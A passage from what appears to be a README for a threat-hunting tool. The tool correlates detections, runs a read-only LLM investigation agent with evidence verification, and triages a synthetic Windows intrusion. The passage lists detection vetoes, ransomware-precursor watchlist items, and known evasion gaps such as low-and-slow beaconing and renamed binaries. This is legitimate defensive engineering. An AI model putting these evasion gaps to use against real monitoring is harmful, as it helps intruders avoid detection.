  09:28:00 ATH-005  CRITICAL  svc_backup  FS02             T1078,T1110.001            evt-000394 (+14)
  09:33:47 ATH-006  HIGH      svc_backup  PC01 -> FS02     T1021.002,T1078            evt-000431
  09:34:12 ATH-007  HIGH      svc_backup  FS02             T1021.002,T1569.002        evt-000435
  09:35:40 ATH-008  HIGH      svc_backup  FS02             T1074.001,T1560.001        evt-000445
  09:37:05 ATH-003  MEDIUM    svc_backup  FS02             T1071.001                  evt-000454
```

Eleven findings, 31 telemetry events, two hosts, 19 links -- all 19 structural. `ATH-009`
and `ATH-010` (added by the [detection-engineering loop](#detection-engineering-loop))
correlate into this same case automatically, via shared process lineage, with no change
to the correlator. The administrator's two findings form a separate `CASE-002` and
never merge in.

---

## The investigation agent

Everything above this line is deterministic Python. This section is the one place an
LLM can participate -- and it can be removed entirely (`--no-llm`, or simply no API key
configured) with the investigation still running to completion.

### The one design decision that matters most

**The agent never receives the dataset.** Not a sample, not a summary pasted into a
prompt -- it receives a correlated case and a list of read-only tools
(`src/ath/agent/tools.py`), and must ask for everything else: `get_events`,
`process_tree`, `user_auth_history`, `host_network_activity`, `analyse_beacon`,
`search_processes`, `lookup_technique`. Every call is recorded as a `ToolCall`, so
exactly what the model saw can be replayed later. There is no tool that disables an
account, isolates a host, or writes to telemetry -- response actions are a later
milestone and will require human approval before anything destructive runs.

### FACT / INFERENCE / HYPOTHESIS

Every claim the agent layer produces declares its own epistemic status, and the
distinction is enforced in code, not by convention:

```python
class Claim:
    def __post_init__(self):
        if self.claim_type.requires_evidence and not self.evidence_ids:
            raise ValueError(...)          # FACT/INFERENCE must cite evidence
        if self.claim_type is FACT and self.source not in DETERMINISTIC_SOURCES:
            raise ValueError(...)          # a model can NEVER author a FACT
```

| Type | Meaning | Who may author it |
| --- | --- | --- |
| **FACT** | Directly readable from telemetry or a deterministic detector | tools, detectors, correlator only |
| **INFERENCE** | A reasonable conclusion, evidence-backed | model or deterministic analysis |
| **HYPOTHESIS** | Unverified; may cite no evidence at all -- that's what makes it one | model or deterministic analysis |

If the model "believes" something is a fact, the correct move is to call a tool and let
the *tool* author the FACT. A model's belief about the data is an inference until
confirmed.

### The verifier: the anti-hallucination control

`ClaimVerifier` checks every claim's `evidence_ids` against the real telemetry loaded for
that run. A claim citing an event id that does not exist is rejected -- kept, not
discarded, so a hallucination rate is a measurable property of a run rather than a vibe.
Demonstrated directly in `tests/test_orchestrator.py`: a scripted, deliberately
adversarial model response containing one legitimate claim, one claim citing a
fabricated event id, and one attempted FACT is fed to the orchestrator. The result:
the FACT is rejected at construction, the fabricated citation is rejected by the
verifier, and only the legitimate claim survives.

### Specialists run conditionally, not on a fixed script

Four specialists, each owning one question. Each declares the telemetry it **needs** and
the evidence it **responds to** — never a list of rule ids:

| Specialist | Question | Needs | Triggered by |
| --- | --- | --- | --- |
| **Endpoint** | What ran, and what started it? | `process_execution`, `process_lineage` | case evidence resting on process telemetry |
| **Identity** | Whose credentials, from where? | `authentication` | auth telemetry, or the **Credential Access** tactic |
| **Network** | Who was contacted, and is the timing automated? | `network_flow` | network telemetry, or another specialist's request |
| **ATT&CK** | What does this match, and what's missing? | — | mappings exist, deferred until after step 0 |

Each exposes `should_run(state) -> (bool, reason)`. A case with only authentication
findings never triggers process-tree analysis — the gate refuses, and the refusal is
logged with its reason, so a skipped agent is as explainable as one that ran.

#### Why eligibility is a capability, not an allowlist

Gates used to match literal rule ids: `{"ATH-001", "ATH-002", "ATH-004", "ATH-007",
"ATH-008"}`. That had two failure modes, and this project hit **both**.

**It went stale silently.** `ATH-009` and `ATH-010` were added in Milestone 6. Both are
process rules. Neither was added to that set — so endpoint lineage analysis quietly
stopped applying to them, with no error, no failing test, and a plausible-sounding
*"case contains no process-based findings"* recorded as the reason. Exactly the class of
failure this project exists to prevent: a component that looks healthy while being blind.

**It could not generalise.** A case from any other rule catalogue matched nothing, so
*every* specialist declined and the investigation completed as `EXHAUSTED` having done
no work:

```
# before -- a case carrying cloud rule ids
endpoint  eligible=False :: case contains no process-based findings
identity  eligible=False :: case contains no authentication or credential-access findings
network   eligible=False :: case contains no network findings and none were requested
attack    eligible=False :: case has no ATT&CK mappings to interpret
```

The specialists' *logic* was never Windows-specific — only the allowlist was. Since
every `Finding` already carries `fields_used`, a case can be asked what **kinds** of
telemetry its evidence rests on, mapped through the same `TelemetryChannel` vocabulary
the visibility model uses:

```
# after -- the identical case, unchanged specialist logic
endpoint  eligible=True  :: case evidence rests on process_command_line,
                            process_execution, process_lineage telemetry (from K8S-001)
identity  eligible=True  :: case evidence rests on auth_source_attribution,
                            authentication telemetry (from AWS-001)
network   eligible=False :: case evidence rests on no outbound network communication
                            telemetry and no specialist requested it
```

Note the third line: this is capability matching, not "always run". The discrimination
survives; only the coupling to a specific catalogue is gone.

`ATH-004`'s special case — *"credentials were touched, so check where those accounts
were used next"* — became `triggered_by_tactics = {"Credential Access"}`. The intent was
always a tactic, not a rule id, and any future rule mapping to that tactic now triggers
the same follow-up without being registered anywhere.

#### A specialist can decline because it cannot see

When an `EnvironmentModel` is attached, a specialist whose required channel is
unavailable declines *for that reason*:

```
endpoint  eligible=False :: required telemetry is unavailable in this environment:
                            process_execution, process_lineage -- this specialist would
                            find nothing regardless of what occurred
```

This carries the visibility model's central distinction — *"nothing happened"* versus
*"we cannot see"* — into the investigation layer. With **no** environment attached,
specialists proceed: a missing visibility assessment is not evidence that telemetry is
missing, and declining on that basis would be the very inference this project forbids
everywhere else.

### The orchestrator: plan -> act -> verify -> conclude

```
while step < max_steps:
    specialist, reason = plan(state)      # menu of ELIGIBLE specialists only
    if specialist is None: stop            # deterministic: no work left
    result = act(state, specialist)        # run it; failures are contained
    verify(state, result)                  # check claims against real telemetry
synthesise(state)                          # optional: model finds cross-claim links
```

Two constraints make "autonomous" mean something specific rather than "unsupervised":

1. **The model chooses from a menu; it can never invent an action.** The planner is
   given only the specialists whose gate already passed, by name. A response naming
   anything else -- tested directly with a scripted `"next_agent": "exfiltration_agent"`
   -- is discarded and the deterministic priority order (`endpoint -> identity ->
   network -> attack`) takes over.
2. **Stopping is deterministic.** The loop ends when no specialist is eligible, or at a
   hard step budget (`max_steps`, default 8) that no model response can extend. The
   model is never asked "are you done?" -- a model that wants to keep going always says
   no. Tested with a scripted response repeated 20 times: the loop still stops at the
   budget.

### Deterministic mode is not a fallback -- it's the default

With `NullLLM` (no API key, or `--no-llm`), the planner uses a fixed priority order and
synthesis is skipped. The investigation still runs to completion and produces the full
set of evidence-backed claims -- 49 of them for `CASE-001` in this dataset, 19 FACT, 28
INFERENCE, 2 HYPOTHESIS, 0 rejected. The model adds planning judgement and cross-claim
synthesis on top; it does not gate whether the system works.

### LangGraph is a runtime choice, not the design

`src/ath/agent/graph.py` wires the exact same `plan`/`act`/`verify` functions into a
LangGraph `StateGraph`. A test (`test_langgraph_run_matches_direct_orchestrator_call`)
asserts the two runtimes produce **identical** claims and status for the same case.
`langgraph` is imported only inside `build_graph()`, never at module level, so the whole
`ath.agent` package remains importable and every other test in the suite runs
unaffected if `langgraph` is not installed -- confirmed by monkey-patching `build_graph`
to raise `ImportError` and checking the orchestrator falls back transparently.

### Example: CASE-001 investigated

```
$ python main.py investigate --no-llm --case CASE-001

status     : complete
steps      : 4  |  agents run: endpoint, identity, network, attack
claims     : 19 facts, 28 inferences, 2 hypotheses

-- investigation path --
  step 1: endpoint -- deterministic priority order; case contains process-based findings
  step 2: identity -- deterministic priority order; case contains authentication findings
  step 3: network  -- deterministic priority order; case contains external connection findings
  step 4: attack    -- only eligible specialist; ATT&CK mappings + gathered evidence
  step 5: stop      -- no specialist has further useful work on the available evidence

-- FACTS --
  FACT: On PC01, WINWORD.EXE (PID 4820) was started by OUTLOOK.EXE under account jdoe.
    evidence: [evt-000320]
  FACT: Execution chain on PC01: OUTLOOK.EXE -> WINWORD.EXE -> powershell.exe -> rundll32.exe.
    evidence: [evt-000344, evt-000322, evt-000320]
  FACT: Connections from PC01 to 185.220.101.47 occurred at a median interval of 300s
        with a robust coefficient of variation (MAD/median) of 0.000 across 7 connections.
    evidence: [evt-000323, evt-000326, evt-000341, evt-000372, evt-000398, evt-000427, evt-000457]

-- INFERENCES --
  INFERENCE: The 14 failed authentications for 'svc_backup' followed by success are
             consistent with the account's password having been guessed rather than
             with ordinary user error.  (confidence 0.85)

-- HYPOTHESES (unverified, flagged as such) --
  HYPOTHESIS: The credentials for 'svc_backup' may have been obtained from memory on
              PC01. This is unverified: no telemetry links the credential-access
              activity to this specific account.  (confidence 0.40)
  HYPOTHESIS: Data staged on disk may have been transferred to the external destination
              observed in this case. This is unverified: the telemetry records archive
              creation and outbound connections separately, and does not show the
              archive's contents leaving.  (confidence 0.50)
```

Note what the credential-source and exfiltration claims are: HYPOTHESES, not facts --
because the telemetry genuinely does not establish either one. That is the entire point
of the epistemic split.

---

## Investigation reports

`python main.py report` turns a completed investigation into a self-contained,
evidence-cited document. Nothing in this layer calls a language model -- assembly is
reorganisation over data the deterministic pipeline and the agent layer already
produced (`src/ath/reporting/builder.py`).

### Calibration is enforced on the rendered sentence, not just the data type

Every other layer of this project enforces FACT/INFERENCE/HYPOTHESIS as *data*: a
`Claim` cannot be constructed without evidence, a model cannot author a FACT. A report
is prose, though, and prose is where calibration quietly leaks -- it is entirely
possible to take a well-typed HYPOTHESIS and render it as "The attacker exfiltrated the
archive": grammatically confident, semantically overclaiming, still technically "backed
by" a Claim object.

So `src/ath/reporting/language.py` does two things:

1. Every claim renders through a fixed prefix -- `Confirmed:`, `Assessed:`,
   `Unconfirmed hypothesis:` -- so the epistemic status survives even if a bullet is
   copied out of its section.
2. `audit_calibration()` lints the **rendered sentence** for absolute language
   ("proves", "certainly", "conclusively") on anything that is not a FACT, and the
   inverse -- hedge words ("might have", "possibly") on a FACT, which usually means the
   claim was mis-typed in the first place. `cmd_report` runs this audit at generation
   time and prints a warning if it ever fires; a regression test also runs it against
   every claim the specialists currently produce, so a careless future template edit
   would be caught immediately.

### Recommendations are traceable, not generic advice

Every `RecommendedAction` names the specific hypothesis or ATT&CK coverage gap that
produced it (`based_on`). A recommendation with no traceable origin would be the
report-writing equivalent of an unevidenced Finding, which this project does not allow
anywhere else.

```
1. Reset credentials for 'svc_backup' and audit LSASS access controls...
   Based on: The credentials for 'svc_backup' may have been obtained from memory on
             PC01. This is unverified...
2. Review proxy, firewall, or network-flow logs for data volume transferred...
   Based on: Data staged on disk may have been transferred to the external
             destination observed in this case. This is unverified...
3. Retrieve email gateway or web-proxy logs to establish the initial access vector.
   Based on: MITRE ATT&CK tactic coverage gap: Initial Access
6. Escalate to a human analyst for validation before any remediation action is taken.
   Based on: system design constraint
```

The last recommendation is present in **every** report, always, because this system has
no destructive capability and the report is not authorisation for one.

### The report is self-contained

The **Evidence Appendix** renders every underlying telemetry event -- timestamp, host,
user, a one-line summary -- so a reader never has to re-run a tool to see what
`evt-000322` actually was. Long inline evidence lists (a claim like "43 authentication
events" genuinely cites all 43) are truncated to 6 ids with a pointer to the appendix --
a rendering choice only; the full list stays on the `Claim` object for verification.

### Example: what got flagged as a HYPOTHESIS survives into the report unchanged

```
### Unconfirmed Hypotheses (2)

*Possible explanations that have NOT been verified. Treat as open questions for the
analyst, not as findings.*

- Unconfirmed hypothesis: The credentials for 'svc_backup' may have been obtained from
  memory on PC01. This is unverified: no telemetry links the credential-access
  activity to this specific account.  (confidence 0.40)
- Unconfirmed hypothesis: Data staged on disk may have been transferred to the
  external destination observed in this case. This is unverified: the telemetry
  records archive creation and outbound connections separately, and does not show
  the archive's contents leaving.  (confidence 0.50)
```

No template, however polished, is allowed to upgrade either of these to a confirmed
finding -- the prefix and the underlying `ClaimType` are the same object.

---

## Telling benign from malicious

Every layer above this one searches for reasons to be suspicious. None searched for
reasons *not* to be — and the system was already computing the exculpatory evidence and
throwing it away.

`ATH-002` decodes the administrator's payload, sees no evasion flags, sees it fetches
nothing, notes its parent is patch-management tooling, uses all of that to grade the
finding **LOW** — and then emits an alert indistinguishable in kind from the attacker's.
*Low severity is not the same statement as "here is why this is legitimate."* The first
still costs a triage decision and gives the analyst nothing to make it with.

`python main.py hunt --triage` turns that discarded evidence into an explicit,
cited counter-case:

```
[LOW] ATH-002  Encoded PowerShell command execution
  device     : PC07     user: adm_sarah
  triage     : likely benign  (benign score 7/4)
    Consistent with legitimate activity: started by CcmExec.exe, identified in this
    environment as Microsoft Configuration Manager (patch management); the command line
    carries no hidden-window, no-profile or bypass flags; the decoded payload retrieves
    no remote code: Get-WmiObject -Class Win32_QuickFixEngineering
```

### It annotates, never suppresses

This is the same shape as the ATT&CK mapper: gated interpretations over findings the
deterministic layer already produced. **No finding is ever deleted or edited.** A
pipeline that silently dropped alerts it believed benign would be unauditable, and the
first time it was wrong nobody would ever find out.

### Benign evidence can be out-voted, never out-weighed

Any incriminating indicator vetoes a benign disposition outright, regardless of how much
exculpatory evidence accumulated. The asymmetry is deliberate — wrongly reassuring an
analyst about a real intrusion is not comparable to asking them to look at something
legitimate.

| Benign signal | Weight | | Veto (blocks benign outright) |
| --- | --- | --- | --- |
| Parent is a recognised management/security product | 3 | | Evasion flags present |
| Destination contacted broadly by many processes | 3 | | Decoded payload fetches remote code |
| No evasion flags on the command line | 2 | | Office application parent |
| Decoded payload fetches nothing | 2 | | Cleartext external retrieval |
| Parent is widespread estate tooling | 2 | | Sustained repeat contact by an interpreter |
| TLS on 443 only | 1 | | Detection already graded it HIGH+ |

Threshold is 4, so a single signal is never enough — the administrator's script clears it
on three independent observations, not one.

### A name is a claim; a signature is evidence

`is_known_security_tool` originally matched on image name, so a payload dropped as
`MsMpEng.exe` inherited Microsoft Defender's standing and earned the largest single
benign signal available — for the price of a rename.

The canonical schema now carries **`sha256`, `signer`, and `signature_status`** alongside
`file_path`, and recognition requires the name to match *and* every observation of that
name in the environment to be validly signed by one organisation. One unsigned copy
anywhere revokes the name entirely:

```
dropped MsMpEng.exe in C:\Users\jdoe\AppData\Local\Temp\  ->  signer=''  status=unsigned
is_known_security_tool('MsMpEng.exe')  ->  None
identity_conflict('MsMpEng.exe')       ->  validly signed by Microsoft Corporation in
                                            some observations and unsigned in others
disposition: likely_malicious
```

**The honest limit, asserted in a test:** `powershell.exe` and `rundll32.exe` are
genuinely Microsoft-signed *while running the attacker's payload in this very dataset*.
Signature answers "is this file what it claims to be", never "is what it is doing
legitimate" — which is why the vetoes, not the signature, remain load-bearing.

The Defender adapter maps `SHA256` and `ProcessVersionInfoCompanyName`, and sets
`signature_status` to **`unknown`** rather than guessing: Defender records signature
status in a separate table, and "we did not evaluate it" is a different claim from
"the file is unsigned".

### Prevalence over more than one window

A single prevalence figure conflates *rare because new* with *rare because it does not
belong*. Every profile now carries a recent slice alongside the full window, so
something spreading is distinguishable from something established — and
`ubiquitous_destination` requires the destination to have been present across the window,
not merely to be widespread now. Reach that appeared recently is the shape of a rollout
**or a worm**, and neither earns benign credit.

Each figure carries what it can bear:

```
observation window is only 4.0h, far short of the weeks needed to establish what is
normal; treat prevalence as a weak signal here
```

### The hole prevalence opens, and closing it

"Many hosts talk to this address" is the strongest benign signal available without threat
intelligence. It is also exactly the signal an adversary defeats by **living off trusted
infrastructure**: C2 through a popular cloud service inherits that service's reach.

Tested rather than assumed. A synthetic 48-connection beacon to the environment's
most-contacted destination, TLS only, was marked `likely_benign` — the worst output this
system could produce. The `sustained_interpreter_contact` veto closes it on volume, which
is what separates a beacon from an inventory script that checks in once:

```
LOTL beacon (48 conns, TLS, ubiquitous dest): likely_malicious
  Incriminating: a script interpreter contacted this destination 48 times; repeat
  contact is the shape of automated callback, and reach alone cannot excuse it
```

A regression test asserts both directions — the beacon is not cleared, **and** a
one-connection contact to the same destination still is, so the hole was closed without
removing the capability.

### Absence of bad news is not evidence of legitimacy

`tests/test_triage_adversarial.py` attacks this layer deliberately — impersonation,
hiding behind trusted infrastructure, forged metadata, signal stacking, baseline
poisoning. One attack succeeded and produced the most useful fix in the set:

A finding naming a parent process the environment had **never seen**, with an empty
command line, scored `no_evasion_indicators` (2) + `no_download_indicators` (2) = 4 and
was cleared as benign. Nothing about it was known to be legitimate — it had simply
avoided tripping anything, which is the *easy half of evasion*.

Signals are now split into **affirmative** (something is positively known: recognised
tooling, established process, established destination) and **supporting** (an
incriminating marker was looked for and not found). A benign verdict requires at least
one affirmative signal as well as the score, so absence can corroborate but never
substitute:

```
Nothing incriminating was found, but nothing positively identifies this as
legitimate either: the command line carries no hidden-window, no-profile or bypass
flags; the decoded payload retrieves no remote code
```

**One attack still succeeds and the test says so.** Low-and-slow contact — four
connections to a widely-used destination over TLS — stays under the sustained-contact
threshold and is cleared. Defeating it needs inter-arrival regularity, which lives in
the investigation layer's `analyse_beacon` and is not available at triage time. The test
asserts the current behaviour explicitly so closing the gap breaks it and forces this
paragraph to be updated.

### Analyst feedback: measuring against reality, not fixtures

Benchmark numbers measure the system against scenarios its authors invented.
`python main.py feedback` measures it against what analysts actually concluded:

```
=== ANALYST FEEDBACK ===
  verdicts recorded : 4
  agreement         : 67% (2/3 where triage took a position)
  opinion rate      : 75% (3/4; 1 left as needs-review)

  1 finding(s) called BENIGN that an analyst confirmed as real threats:
    - ATH-002:evt-000322

  measured false-positive cost by rule:
    ATH-003  2 analyst-confirmed false positive(s)
```

Four design decisions worth stating:

- **Append-only.** A verdict is a fact about what someone concluded; a revised opinion
  supersedes for scoring but never erases. A store that overwrote history could not tell
  "we were right the first time" from "we were never wrong".
- **Abstention is never scored as agreement.** `needs_review` counts as neither right
  nor wrong, and `opinion_rate` is reported beside `agreement_rate` — otherwise the
  highest-scoring strategy would be to have no opinion about anything.
- **Dangerous disagreements are tracked separately.** Calling a confirmed threat benign
  is not comparable to other errors, and one instance deserves more attention than any
  aggregate rate.
- **It never feeds back automatically.** Nothing here changes a rule, threshold, or
  signal. A system that silently re-tuned on analyst clicks would drift unauditably —
  and an attacker who got one finding dismissed would train it to dismiss the next.

### Measured

| | Windows intrusion | Quiet day |
| --- | --- | --- |
| False positives explained | 2 / 2 | 2 / 2 |
| True positives wrongly cleared | **0** | **0** |
| Findings needing review | 13 → **11** | 2 → **0** |

On a day with no attack, residual analyst load is now **zero** — both findings arrive
with a cited benign verdict instead of a bare severity. The false positives still
*happen*; noise-case counts deliberately still report them, because a metric that hid
them would remove the pressure to make the rules themselves better.

---

## How useful is this, actually?

Every metric above this line is a *component* metric — does this rule fire, does this
mapping gate correctly. None of them answer the question that matters: **given a real
incident, does an analyst end up better off?**

`python main.py benchmark` runs the whole pipeline over labelled incidents and measures
what an analyst would actually receive. It currently reports **5 of 5 incidents meeting their
success condition** -- which is exactly when a benchmark is most at risk of becoming
decorative, so the numbers underneath stay reported individually. "All incidents pass"
is not the same claim as "the system is quiet": the Windows scenario still raises a
false-positive case, and case precision is still 50%.

| | INC-001 Windows intrusion | INC-002 Cloud credential stuffing | INC-004 Ransomware prep | INC-005 Kubernetes escalation | INC-003 Quiet day |
| --- | --- | --- | --- | --- | --- |
| **Verdict** | PASS | PASS | PASS | PASS | PASS |
| Detected | yes | yes | yes | yes | n/a (success = silence) |
| Event recall | 100% (31/31) | 93% (13/14) | 100% (6/6) | 100% (2/2) | — |
| Findings → cases | 13 → 2 | 1 → **0** | 4 → 3 | 2 → 1 | 2 → **1** |
| Triage reduction | 85% | — | 25% | 50% | — |
| Noise cases | **1** | 0 | **1** | 0 | **1** |
| Findings after triage | 11 | 1 | 2 | 2 | **0** |
| Facts produced | 19 | **2** | 1 | 3 | 1 |
| Case precision | **50%** | — | 67% | 100% | 0% |
| Chain recall / purity | 100% / 100% | — | 50% / 100% | 100% / 100% | — |
| Claims | 19 fact, 28 inference, 2 hypothesis | **none** | 1 fact, 2 inference | 3 fact, 5 inference | 1 fact, 5 inference |
| Fabricated citations | 0 | 0 | 0 | 0 | 0 |
| Cost | 43 tool calls, 0.41s | 3 tool calls, 0.02s | 3 tool calls, 0.30s | 5 tool calls, 0.03s | 7 tool calls |

### What the failures mean

**INC-002 was the benchmark's most valuable finding, and is now fixed.** `ATH-005` fired
on CloudTrail unmodified — but produced *one* finding, and correlation required two
structurally linked findings to form a case. No case meant no investigation: **0 facts,
0 tool calls**. The system detected the incident and then had nothing to say about it,
and a detection-only metric would have scored that a success.

Two fixes were needed. A lone finding at or above HIGH is now raised as a single-finding
case, so **severity, not corroboration, decides whether something is investigated** —
and a singleton reports `confidence=low` with an explanation saying plainly that nothing
corroborates it, so it cannot borrow a chain's credibility. That still left the incident
failing on `203.0.113.42`: `IdentityAgent` reported only resolved source *hostnames*,
which cloud telemetry never carries, so the sole piece of origin evidence available was
being dropped.

**INC-003: a quiet day is not quiet, but it is now explained.** With the intrusion
removed and the benign background otherwise identical, the system still raises 2 findings
and 1 case — but the [triage layer](#telling-benign-from-malicious) accounts for both,
so nothing is left for an analyst to investigate. The benign success condition was
changed from `cases == 0` to `findings_after_triage == 0` when that layer was added;
that is a deliberate change of bar, argued in `IncidentOutcome.passed`, and noise cases
are still reported so the case that is raised stays visible.

**INC-001: half the cases are false alarms.** Case precision is 50% — the intrusion is
found perfectly (100% recall, 100% purity, in a single case) but the IT administrator's
encoded-PowerShell look-alike produces a second case alongside it.

**INC-005 repeated INC-002's story, for a missing specialist instead of a missing case
(Milestone 13).** `K8S-001`/`K8S-002` fired on Kubernetes audit telemetry and correlated
correctly via `shared_evidence` — but investigation used `default_specialists()`, the
fixed roster that predates environment-driven crew assembly and includes nothing that
reads `ath.schema.EVENT_CONTROL`. Same shape as INC-002 before its fix: **0 facts, 0 tool
calls**, detected and correlated with nothing to say about it. The fix this time is not
another exception to correlation's rules, it is [environment-driven crew
assembly](#adaptive-crew-assembly): once the orchestrator assembles its roster from what
the environment can actually see, `ControlPlaneAgent` stands up automatically and the
incident is investigated for real — 3 facts, 5 inferences, 5 tool calls, all conclusions
reached.

### Two measurement bugs this harness had first

Worth recording, because both made the system look better than it was:

**Every labelled scenario was counted as malicious.** Ground truth labels
`benign_lookalike` *because it is benign* — it is the decoy. Counting it as an attack
inflated the recall denominator and, worse, made the known false-positive case register
as a true positive: the harness reported **zero noise cases** while a real false alarm
sat in its own output.

**An incident that produced no case passed vacuously.** When correlation formed no case,
the harness skipped every conclusion check and left `conclusions_missed` empty — so
INC-002 reported a clean pass having run no investigation at all. Both are now
regression-tested, and `tests/test_incidents.py` asserts the *measured values* rather
than that everything passes, so closing a gap forces the number here to be updated with
it.

---

## Environment understanding and visibility

Every layer above this one answers *"what happened?"*. None of them could answer
*"what could we not have seen?"* — and in security those are different questions with
very different consequences:

```
"No suspicious DNS activity was detected."
"There is no DNS telemetry, so whether suspicious DNS activity occurred is unknown."
```

The first is a finding. The second is a gap. A system that renders the second as the
first converts blindness into reassurance.

### The environment is derived, not configured

`python main.py environment` builds a structured model from telemetry alone —
deterministically, with no model involved, because this is the ground truth later
reasoning rests on.

```
platform    : windows  (observed Windows system processes: svchost.exe)
hosts       : 8   identities: 8

-- hosts --
  APP01    server        reached by remote authentication from 5 host(s) (PC01, PC02,
                         PC03, PC05, PC07) with no interactive logon observed
  PC01     workstation   interactive logon(s) by jdoe and no inbound remote
                         authentication observed

-- identities --
  svc_backup   service      3 service-type logon(s) and no interactive logon observed
    privilege signal: 1 process event(s) referencing an administrative share
                      (ADMIN$/C$/IPC$), which requires local administrator rights
```

**Roles come from behaviour, never from names.** `FS02` looks like a file server and in
this dataset that is even correct — which is exactly why it must not be the basis. A
test renames every host to `NODE000…NODE007` and asserts the roles are unchanged; if
the classifier were reading hostnames, that test would collapse.

**Privilege is measured against the environment, not a constant.** The first version of
this heuristic flagged accounts reaching three or more hosts, which marked **7 of 8
accounts** here — everyone touches the shared file and app servers. That is the same
mistake [ATH-006](#design-choices-worth-explaining) exists to avoid, so reach is now
compared to the environment's own median. What remains is one account, flagged on
direct evidence of administrative-share access.

### What the model refuses to guess

The last thing `environment` prints, deliberately, is what it could not determine:

```
-- NOT determinable from this telemetry --
  - Asset criticality: which hosts or accounts matter most is a business fact, not a
    telemetry fact, and must be supplied rather than inferred.
  - Group membership and actual privilege: no directory or IAM telemetry is ingested.
  - Baseline normality: the observation window is 4.0 hours. Distinguishing unusual
    from merely unfamiliar needs weeks of history.
  - Externally exposed services: no inbound network telemetry is present.
  - Cloud infrastructure: no cloud control-plane telemetry is ingested. The
    environment may have cloud assets that are entirely invisible here.
```

A description that lists only what it found reads as complete. This list is what stops
a downstream reader — or a future capability planner — from treating silence as absence.

### Telemetry channels: available, sparse, or absent

`python main.py visibility` measures every channel directly off the loaded tables.
Two distinctions carry most of the value:

| State | Meaning | How you fix it |
| ----- | ------- | -------------- |
| `available` | Populated well enough to build on | — |
| `partial` | Present but sparse | investigate why; a rule reading it is near-blind |
| `absent_in_data` | The schema supports it; this dataset has none | onboarding / configuration |
| `absent_by_schema` | The canonical schema cannot carry it at all | a code change |

```
process_command_line     available        429 of 429 rows (100.0%) carry a value
network_url              partial          only 2 of 389 rows (0.5%) carry a value --
                                          a detection reading this field would run but
                                          see very little
network_inbound          absent_in_data   the schema supports this channel but no row
                                          carries a value (0 of 389)
dns_query                absent_by_schema onboard DNS resolver logs or Sysmon event 22
```

**`partial` is the dangerous state**, and the reason this analysis exists. A rule
reading a field populated on 0.5% of rows does not fail — it returns few findings, and
a dashboard renders that identically to "no attacks occurred".

**Inbound visibility is measured by value, not by column presence.** `direction` is
populated on every network row, so counting non-empty cells would report inbound
network visibility as 100% available while the dataset contains only outbound flows.
Both facts are regression-tested.

### Coverage has four states, not two

Reporting coverage as covered/uncovered collapses problems with completely different
remedies:

| State | Meaning | Remedy |
| ----- | ------- | ------ |
| **DETECTABLE** | A rule exists and its telemetry is present | none |
| **OBSERVABLE_UNDETECTED** | The data is here; nobody wrote the rule | detection engineering |
| **UNVERIFIABLE** | A rule exists but its telemetry does not | restore telemetry, or retire the rule |
| **UNOBSERVABLE** | The telemetry does not exist | onboard a source — no rule can help |

```
$ python main.py visibility

detectable 11  |  observable but undetected 5  |  unverifiable 0  |  unobservable 9

-- OBSERVABLE BUT UNDETECTED -- the data is already here; write a rule (5) --
  T1053.005   Scheduled Task  [Persistence]
      schtasks.exe invocations are visible in command lines; no rule reads them.
  T1490       Inhibit System Recovery  [Impact]
      vssadmin/wbadmin deletion is command-line visible and commonly precedes ransomware.

-- UNOBSERVABLE -- no rule can close these; onboard telemetry (9) --
  T1071.004   DNS  [Command and Control]
      needs: dns_query
      DNS-tunnelled C2. With no resolver telemetry this is not detectable at any threshold.
  T1059.001-scriptblock   PowerShell (in-memory / multi-stage)  [Execution]
      needs: script_block
      A downloader's *second* stage never appears on a command line. ATH-002 decodes
      the launcher; what it fetched is unobservable without script block logging.
```

The watchlist is deliberately **broader than the ATT&CK catalogue**. `ath.mitre.attack`
holds only techniques this project can evidence, so an `AttackMapping` can never name
one we cannot support. But a coverage report scoped to "things we can already see"
could never report a blind spot — it would be grading the exam it wrote. Entries
appearing in both must agree on name, which a test enforces.

Three of the gaps above are ones this README already described in prose. They are now
*computed*, and would reappear automatically if the telemetry changed.

### Rule support is three states, for the same reason

A rule missing its core channel and a rule reading a sparse *enrichment* field are not
the same problem. `ATH-003` detects on `remote_ip`/`remote_port` and reads `remote_url`
only to sharpen severity, so it is reported as `degraded` — still firing, grading less
precisely — rather than broken:

```
=== DETECTION SUPPORT ===
  ATH-003  degraded: reads sparsely populated telemetry (network_url); it still fires
           on its remaining fields, but any grading that depends on these is weakened
```

Collapsing that into "unsupported" would report a working detection as broken, and a
reader who checks one false alarm stops reading the rest of the report.

### The same analysis, two environments

The point of deriving all of this rather than configuring it: run it against the
Defender fixture instead of the synthetic dataset and the posture genuinely differs.

| | synthetic | defender_export |
| --- | --- | --- |
| detectable | 11 | 8 |
| observable but undetected | 5 | 5 |
| unverifiable | 0 | **1** |
| unobservable | 9 | **11** |

Nothing is hardcoded per environment. The smaller export carries no source attribution
on its authentication events, so lateral-movement techniques fall out of reach and a
rule depending on them becomes unverifiable. A test asserts the two verdicts differ —
if the same posture came back for every environment, the analysis would not be reading
the environment at all.

---

## Adaptive crew assembly

Every layer above this one still ran the same four specialists on every case, selecting
among them per-case (`Specialist.should_run`) but never asking whether a capability
belongs in the roster *at all* for a given environment. Milestone 13 adds the step this
project's stated goal — "different environments require different security teams" —
actually depends on: `ath.capabilities.assemble_crew` turns `EnvironmentModel.
observable_channels` into the subset of a small, declarative registry
(`CapabilitySpec`) that can do real work here, before any case exists.

```python
CapabilitySpec(
    id="control_plane", factory=ControlPlaneAgent,
    requires_any=frozenset({CLOUD_MANAGEMENT_ACTIVITY, CONTAINER_AUDIT}),
    description="Cloud/Kubernetes control-plane privilege-escalation chains.",
)
```

`requires_any` matters here specifically: an AWS-only environment and a Kubernetes-only
one should each stand this capability up, without needing both kinds of telemetry at
once. Deterministic and declarative throughout — set membership over a static tuple, no
model in the loop, no ranking. `python main.py crew` is the visible artifact:

```
$ python main.py crew                                    # Windows synthetic dataset
platforms  : windows
standing up (4): endpoint, identity, network, attack
excluded (1): control_plane -- none of its alternative channels are observable:
              cloud_management_activity, container_audit

$ python main.py crew --no-windows --cloudtrail tests/fixtures/cloudtrail \
                       --k8s-audit tests/fixtures/k8s_audit
platforms  : aws, kubernetes
standing up (3): identity, attack, control_plane
excluded (2): endpoint -- missing required channel(s): process_execution
              network  -- missing required channel(s): network_flow

$ python main.py crew --cloudtrail tests/fixtures/cloudtrail \
                       --k8s-audit tests/fixtures/k8s_audit    # + local Windows dataset
platforms  : aws, kubernetes, windows
standing up (5): endpoint, identity, network, attack, control_plane
excluded (0)
```

Three genuinely different crews from three genuinely different environments — not the
same four specialists relabeled, and the hybrid case isn't a rounding of the other two:
